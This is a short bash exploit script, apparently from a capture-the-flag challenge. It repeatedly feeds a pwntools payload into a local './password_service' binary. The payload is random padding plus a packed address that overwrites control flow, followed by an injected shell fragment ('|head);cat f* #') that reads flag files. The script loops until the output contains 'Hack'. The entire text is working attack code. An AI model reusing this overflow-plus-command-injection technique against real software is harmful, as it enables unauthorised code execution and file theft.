#!/bin/bash
i=0
while true; do
	RES=$(python -c 'from pwn import *;import random; print chr(random.randint(1,255))*30+p32(0x804872e)+"\n"+"2"+"\x27"*6+"|head);cat f* #"' | ./password_service)
if [[ $RES == *"Hack"* ]]; then
	echo $RES
	exit

fi
echo $RES
i=$((i+1))
echo $i
done
